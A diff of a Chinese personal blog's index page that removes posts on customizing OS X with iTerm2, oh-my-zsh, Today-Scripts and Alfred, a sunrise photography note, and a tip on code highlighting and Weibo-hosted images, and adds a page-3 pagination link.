-        <p>先附上几张照片吧</p><br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1ewpa4y4ivcj31400p012q.jpg"><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1ewpa4xlolpj31400p00vk.jpg"><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1ewpa4ypqupj31400p044g.jpg"><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewpa4z7lckj30fk03vmxh.jpg"><br><p><br>这个就是传说中的Mac OS X User Edition啦，貌似Apple的新出的系统也没有这么炫酷吧+_+，今天瞎捣鼓了一下，也重新认识了下强大的OS X系统。<br><br>改变的主要有以下几点：<br><br><li>使用<a href="https://www.iterm2.com" target="_blank" rel="external">iterm2</a>和个性化配置<a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/themes/" target="_blank" rel="external">oh-my-zsh。</a></li><br><li>使用<a href="https://github.com/SamRothCA/Today-Scripts/releases" target="_blank" rel="external">Today-Scripts</a>，这是一款能在通知栏运行脚本程序的软件。</li><br><li>使用<a href="https://www.alfredapp.com" target="_blank" rel="external">Alfred</a>来替换系统自带的spotlight。</li><br>iTerm 2 相比自带的 Terminal 应用，有太多优点了。例如，可以设置主题，支持画面分割，各种使用的快捷键，以及快速唤出。配合 Oh My Zsh 使用，效果相当之炫酷。<br><br>当然你首先得安装Zsh和iTerm2。至于怎么安装，直接上官网或者去Github上面clone一下人家的项目就好。<br><br>在<a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/themes/" target="_blank" rel="external">Themes</a>上面下载主题。安装好以后用vim打开.zshrc文件，在配置文件中将<br><code>ZSH_THEME=&quot;robbyrussell&quot;</code>改为：<br><code>ZSH_THEME=&quot;你想改的主题&quot;</code><br>然后打开你的终端看看效果吧。<br><br></p><br><p><br>我还使用了一个新的wight小程序，名字是Today－Scripts。它可以在通知栏运行程序脚本。安装完可以自己添加代码。官方的<a href"https:="" github.com="" samrothca="" today-scripts="" wiki#"="">wiki</a>给出了很多脚本,可以根据需要自己添加，当然你也可以自己写一些脚本来做一些更加Geek的事情。</p><br><p><br>最后强烈推荐一个小程序，名为Alfred，简直黑科技。用快捷键快速调用基本可以完全告别dock和鼠标，然而我并没有购买完整版，完整版甚至可以在搜索框中执行终端的指令，售价17.99欧元。<br></p><br><p><br>ps 我还是抽时间去弄一下markdown吧，Mou已经装好，HTML排版是在是不忍吐槽了。<br></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OS-X/">OS X</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/操作系统/">操作系统</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-2015-10-02-landscape" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/02/2015-10-02-landscape/" class="article-date">
-  	<time datetime="2015-10-02T03:46:46.000Z" itemprop="datePublished">2015-10-02</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/02/2015-10-02-landscape/">晨曦</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p></p><h1>晨曦</h1><p></p>
-<p>早晨四点半起床爬山去做日出的延时摄影，然而效果很不理想。随手附两张照片证明到此一游<br><br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1ewn7ys7uqlj31kw11xnb1.jpg"><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewn7ytpzctj31kw11x7h7.jpg"><br>对了，今天我还要去重拍这个延时，我正好来试一试在网页中外链视频的办法。<br><br>晚安<br></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Landscape/">Landscape</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/摄影/">摄影</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-2015-10-01-method" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/01/2015-10-01-method/" class="article-date">
-  	<time datetime="2015-10-01T04:01:23.000Z" itemprop="datePublished">2015-10-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/01/2015-10-01-method/">添加图片和代码高亮的方法</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>添加代码高亮</h1>
-
-<ul>
-<li>添加代码高亮的方法十分简单，jekyll自带语法高亮功能，你可以使用Pygment或Rouge，在文章中插入一段高亮的代码需要使用下面的Liquid标记（加在代码的两头）：<br>效果就是：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello world demo</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>好吧，其实有个小插曲，就是关于那个Liquid标记的显示问题。我发现只要在vim里给文本增加了程序代码，就会被解释掉。我尝试了&lt;code&gt;标签发现并没有什么卵用，于是一怒之下强行用了大括号的ASCII=_=，然后解决掉了（ASCII码可以在<a href="http://www.w3school.com.cn/tags/html_ref_ascii.asp" target="_blank" rel="external">w3schoo;</a>上面查）。</p>
-<p>添加图片貌似没遇到什么奇葩问题。Github提供的免费空间也是有限的，所以不建议大家把图片存放在自己的repo里。为了解决这个问题，需要使用外链图片。貌似Google出来的教程都是让你把图片外链放在什么photobucket上，其实呢，新浪微博也是可以作为外链的啦（￣▽￣），搞一个微博相册然后上传图片吧，传完以后右键Open Image In New Tab然后复制url。在md文件里按如下方式贴图，可以设置下大小。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">style</span>=<span class="value">"max-width:xxxpx;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"yourlink"</span><span class="value">alt="xx"title="xx"width="xx"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后push刷新你的网页看看吧。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blog/">Blog</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jekyll/">Jekyll</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/前端开发/">前端开发</a>
 	</div>
 
 
@@ -972,7 +1010,7 @@
   
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 </div>
